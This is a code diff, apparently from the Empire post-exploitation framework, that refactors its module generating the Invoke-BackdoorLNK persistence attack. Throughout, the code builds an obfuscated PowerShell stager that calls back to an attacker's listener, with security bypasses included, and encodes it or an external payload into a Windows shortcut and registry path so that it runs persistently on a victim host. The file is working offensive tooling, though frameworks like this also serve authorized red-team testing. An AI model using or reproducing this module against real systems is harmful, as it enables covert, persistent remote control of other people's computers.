@@ -1,9 +1,8 @@
 from __future__ import print_function
 
-import pathlib
 import os
-from builtins import object
-from builtins import str
+import pathlib
+from builtins import object, str
 from typing import Dict
 
 from empire.server.common import helpers
@@ -14,27 +13,32 @@ from empire.server.utils.module_util import handle_error_message
 
 class Module(object):
     @staticmethod
-    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
-        # Set booleans to false by default
-        obfuscate = False
-
-        listener_name = params['Listener']
+    def generate(
+        main_menu,
+        module: PydanticModule,
+        params: Dict,
+        obfuscate: bool = False,
+        obfuscation_command: str = "",
+    ):
 
         # management options
-        lnk_path = params['LNKPath']
-        ext_file = params['ExtFile']
-        cleanup = params['Cleanup']
+        lnk_path = params["LNKPath"]
+        ext_file = params["ExtFile"]
+        cleanup = params["Cleanup"]
 
         # storage options
-        reg_path = params['RegPath']
+        reg_path = params["RegPath"]
 
         # staging options
-        user_agent = params['UserAgent']
-        proxy = params['Proxy']
-        proxy_creds = params['ProxyCreds']
-        if (params['Obfuscate']).lower() == 'true':
-            obfuscate = True
-        obfuscate_command = params['ObfuscateCommand']
+        listener_name = params["Listener"]
+        user_agent = params["UserAgent"]
+        proxy = params["Proxy"]
+        proxy_creds = params["ProxyCreds"]
+        if (params["Obfuscate"]).lower() == "true":
+            launcher_obfuscate = True
+        else:
+            launcher_obfuscate = False
+        launcher_obfuscate_command = params["ObfuscateCommand"]
 
         status_msg = ""
 
@@ -44,51 +48,50 @@ class Module(object):
 
         else:
             # generate the PowerShell one-liner with all of the proper options set
-            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=False,
-                                                           obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
-                                                           userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
-                                                           bypasses=params['Bypasses'])
+            launcher = main_menu.stagers.generate_launcher(
+                listenerName=listener_name,
+                language="powershell",
+                encode=False,
+                obfuscate=launcher_obfuscate,
+                obfuscationCommand=launcher_obfuscate_command,
+                userAgent=user_agent,
+                proxy=proxy,
+                proxyCreds=proxy_creds,
+                bypasses=params["Bypasses"],
+            )
             launcher = launcher.replace("$", "`$")
 
+        # read in the common module source code
+        script, err = main_menu.modules.get_module_source(
+            module_name=module.script_path,
+            obfuscate=obfuscate,
+            obfuscate_command=obfuscation_command,
+        )
 
-        # read in the common powerup.ps1 module source code
-        module_source = main_menu.installPath + "/data/module_source/persistence/Invoke-BackdoorLNK.ps1"
-        if main_menu.obfuscate:
-            obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
-            if pathlib.Path(obfuscated_module_source).is_file():
-                module_source = obfuscated_module_source
-
-        try:
-            with open(module_source, 'r') as f:
-                module_code = f.read()
-        except:
-            return handle_error_message("[!] Could not read module source path at: " + str(module_source))
-
-        if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
-            script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code,
-                                         obfuscationCommand=main_menu.obfuscateCommand)
-        else:
-            script = module_code
+        if err:
+            return handle_error_message(err)
 
         script_end = "Invoke-BackdoorLNK "
-        
+
         if cleanup.lower() == "true":
             script_end += " -CleanUp"
-            script_end += " -LNKPath '%s'" %(lnk_path)
-            script_end += " -RegPath '%s'" %(reg_path)
-            script_end += "; \"Invoke-BackdoorLNK cleanup run on lnk path '%s' and regPath %s\"" %(lnk_path,reg_path)
-       
+            script_end += " -LNKPath '%s'" % (lnk_path)
+            script_end += " -RegPath '%s'" % (reg_path)
+            script_end += (
+                "; \"Invoke-BackdoorLNK cleanup run on lnk path '%s' and regPath %s\""
+                % (lnk_path, reg_path)
+            )
+
         else:
-            if ext_file != '':
-                # read in an external file as the payload and build a 
+            if ext_file != "":
+                # read in an external file as the payload and build a
                 #   base64 encoded version as encScript
                 if os.path.exists(ext_file):
-                    f = open(ext_file, 'r')
-                    fileData = f.read()
-                    f.close()
+                    with open(ext_file, "r") as f:
+                        file_data = f.read()
 
                     # unicode-base64 encode the script for -enc launching
-                    encScript = helpers.enc_powershell(fileData)
+                    encScript = helpers.enc_powershell(file_data)
                     status_msg += "using external file " + ext_file
 
                 else:
@@ -98,25 +101,38 @@ class Module(object):
                 # if an external file isn't specified, use a listener
                 if not main_menu.listeners.is_listener_valid(listener_name):
                     # not a valid listener, return nothing for the script
-                    return handle_error_message("[!] Invalid listener: " + listener_name)
+                    return handle_error_message(
+                        "[!] Invalid listener: " + listener_name
+                    )
 
                 else:
                     # generate the PowerShell one-liner with all of the proper options set
-                    launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', encode=True,
-                                                                   obfuscate=obfuscate, obfuscationCommand=obfuscate_command,
-                                                                   userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
-                                                                   bypasses=params['Bypasses'])
-                    
+                    launcher = main_menu.stagers.generate_launcher(
+                        listenerName=listener_name,
+                        language="powershell",
+                        encode=True,
+                        obfuscate=launcher_obfuscate,
+                        obfuscationCommand=launcher_obfuscate_command,
+                        userAgent=user_agent,
+                        proxy=proxy,
+                        proxyCreds=proxy_creds,
+                        bypasses=params["Bypasses"],
+                    )
+
                     encScript = launcher.split(" ")[-1]
                     status_msg += "using listener " + listener_name
 
-            script_end += " -LNKPath '%s'" %(lnk_path)
-            script_end += " -EncScript '%s'" %(encScript)
-            script_end += "; \"Invoke-BackdoorLNK run on path '%s' with stager for listener '%s'\"" %(lnk_path,listener_name)
+            script_end += " -LNKPath '%s'" % (lnk_path)
+            script_end += " -EncScript '%s'" % (encScript)
+            script_end += (
+                "; \"Invoke-BackdoorLNK run on path '%s' with stager for listener '%s'\""
+                % (lnk_path, listener_name)
+            )
 
-        if main_menu.obfuscate:
-            script_end = data_util.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=main_menu.obfuscateCommand)
-        script += script_end
-        script = data_util.keyword_obfuscation(script)
-
+        script = main_menu.modules.finalize_module(
+            script=script,
+            script_end=script_end,
+            obfuscate=obfuscate,
+            obfuscation_command=obfuscation_command,
+        )
         return script
